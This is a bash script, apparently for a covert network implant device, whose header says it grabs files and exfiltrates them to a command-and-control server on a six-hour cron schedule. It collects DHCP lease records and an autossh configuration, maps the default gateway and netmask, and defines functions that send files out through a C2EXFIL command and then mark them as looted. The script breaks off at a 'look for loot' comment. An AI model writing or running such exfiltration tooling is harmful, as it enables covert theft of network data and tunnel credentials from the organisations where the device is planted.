#!/bin/bash
# Grabs somethings and exfils to c2
# every 6 hours
# 0 */6 * * * * bash /root/scripts/getloot.sh

# comments
# [!] error
# [*] info
# [+] success

## vars
loot="/usb/loot"
looted="/usb/looted"
timestamp=`date +"%Y-%y-%d_%H%M%S"`

## vars
dhcplog="/var/dhcp.leases"
file_array=(
  '/var/dhcp.leases'
  '/etc/config/autossh'
)

# Add a flag for verbose mode
verbose=0
while getopts "v" opt; do
  case ${opt} in
    v)
      verbose=1
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      ;;
  esac
done

# get the default route gateway
default_gateway=$(ip route | grep default | awk '{print $3}')
# get the default route's interface
default_interface=$(ip route | grep default | awk '{print $5}')
# get netmask from the default interface
default_net_mask=$(ip addr show $default_interface | grep $default_gateway | grep inet | grep -v 'default' | awk '{print $2}' | cut -f2 -d'/')

# Print the line only in verbose mode
if [ $verbose -eq 1 ]; then
  echo $default_interface: $default_gateway/$default_net_mask
fi

## functions
exfil_keep() {
  if [ -z "$2" ]
  then
    source="misc"
  else
    source="$2"
  fi

  C2EXFIL STRING $1 ${HOSTNAME}-$source

}

exfil() {
  if [ -z "$2" ]
  then
    lsource="misc"
  else
    lsource="$2"
  fi

  if C2EXFIL STRING $1 ${HOSTNAME}-$lsource
  then
    mv $1 ${looted}
  else
    echo "[!] error exfiltrating $1"
  fi
}

## look at me go!
# look for loot